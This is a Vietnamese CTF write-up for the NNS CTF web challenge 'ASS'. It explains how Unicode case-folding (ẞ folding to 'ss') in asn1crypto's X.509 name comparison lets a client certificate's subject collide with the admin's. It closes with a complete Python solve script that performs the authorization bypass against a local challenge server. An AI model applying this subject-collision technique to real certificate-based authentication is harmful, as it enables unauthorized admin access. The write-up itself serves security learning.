---
title: ASS
date: 2026-09-27
ctf: NNS CTF
category: web
difficulty: easy
---

## Đề bài 
Everything should be self-serve in 2026

File: [web_ass.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_ass.tar.gz)
## Solution
`ASS` = *Administration Self-Service*, một CA nội bộ cấp certificate Ed25519. Muốn lấy flag phải gọi `POST /admin` với cert do CA ký, còn hạn, ký đúng `nonce`, và có **subject bằng subject của cert ADMIN**. Nhưng cert ADMIN không trả private key và chỉ cấp được **một lần**.

Mấu chốt: server so subject bằng `asn1crypto`:

```python!
authorized = ca.subject(presented) == ca.subject(administrator_certificate)
```

`asn1crypto.x509.Name.__eq__` không so byte thô mà so theo luật chuẩn hoá tên X.509 (RFC 4518 / stringprep), trong đó có bước **case-fold (table B.2)**:

```python!
>>> import stringprep
>>> stringprep.map_table_b2('ẞ')   # ẞ = LATIN CAPITAL LETTER SHARP S
'ss'
```

Bộ lọc tên (`names.py`) lại cho phép ký tự trong khối Latin Extended Additional `0x1E00–0x1F00` — đúng nơi có `ẞ` (U+1E9E), vừa `isupper()` vừa fold thành `ss`:

```python!
prep("MASSA")               == " massa "
prep("MA" + "ẞ" + "A") == " massa "   # 'MA' + ẞ + 'A'
```

Hai tên khác nhau ở mức Python string (qua được kiểm tra trùng tên `issued_names`) nhưng bằng nhau khi so subject. Vậy:

1. Đăng ký `ADMIN` tên `MASSA` → chiếm slot admin (không cần private key).
2. Đăng ký `CLIENT` tên `MAẞA` → nhận private key, subject đụng độ admin.
3. Lấy nonce, ký bằng key CLIENT, nộp cert CLIENT vào `/admin` → subject khớp → flag.

->Flag: `NNS{unic0de_subject_c0llisi0n_pwn}`

Full solve:

```python!
import base64, sys, requests
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives.serialization import load_pem_private_key

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:3000"
s = requests.Session()

s.post(f"{BASE}/certificates", json={"profile": "ADMIN",  "name": "MASSA"})
r = s.post(f"{BASE}/certificates", json={"profile": "CLIENT", "name": "MAẞA"})
cert, key_pem = r.json()["certificate"], r.json()["private_key"]

nonce = s.get(f"{BASE}/auth/nonce").json()["nonce"]
key = load_pem_private_key(key_pem.encode(), password=None)
sig = base64.b64encode(key.sign(nonce.encode())).decode()

r = s.post(f"{BASE}/admin", json={"certificate": cert, "nonce": nonce, "signature": sig})
print(r.json())
```
